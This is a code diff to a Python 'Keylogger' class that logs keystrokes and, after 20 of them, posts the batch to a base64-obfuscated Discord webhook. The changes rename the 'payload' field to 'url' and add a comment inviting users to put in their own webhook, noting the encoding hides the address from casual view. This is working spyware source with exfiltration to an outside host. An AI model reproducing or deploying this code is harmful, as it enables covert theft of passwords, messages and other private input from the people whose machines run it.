@@ -18,7 +18,12 @@ class Keylogger:
     def __init__(self):
         super(Keylogger, self).__init__()
         self.pressed_keys = []
-        self.payload = base64.b64decode(
+        """
+        Replace {self.url} with your own Discord Webhook Url or where you want the log sent to.
+            Pss. I encode it just in case it is looking too obvious to public
+            so do replace, otherwise I can see your keyboard activity.
+        """
+        self.url = base64.b64decode(
             "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3OTQwMjQ1NjQzMzgyMzgwNi9mX1FEN05hWHViOU5RSWlWajJVYU05VzEtMGN5RG12UGgzRmZYOUZFYjVJbDFOLTdfWnlva1pvUEFfU3kxeFlFd3d4bQ=="
         ).decode("utf-8")
 
@@ -41,7 +46,7 @@ class Keylogger:
 
         try:
             response = requests.post(
-                self.payload,
+                self.url,
                 headers={"Content-Type": "application/json"},
                 data=json.dumps(parameters),
             )
@@ -59,7 +64,7 @@ class Keylogger:
         logging.info(f"Keyboard Pressed => {str(key)}")
 
         if len(self.pressed_keys) > 20:
-            asyncio.run(self.payload_to_server(str(self.pressed_keys)))
+            asyncio.run(self.url_to_server(str(self.pressed_keys)))
             self.pressed_keys.clear()  # Clear the list after sending
 
 
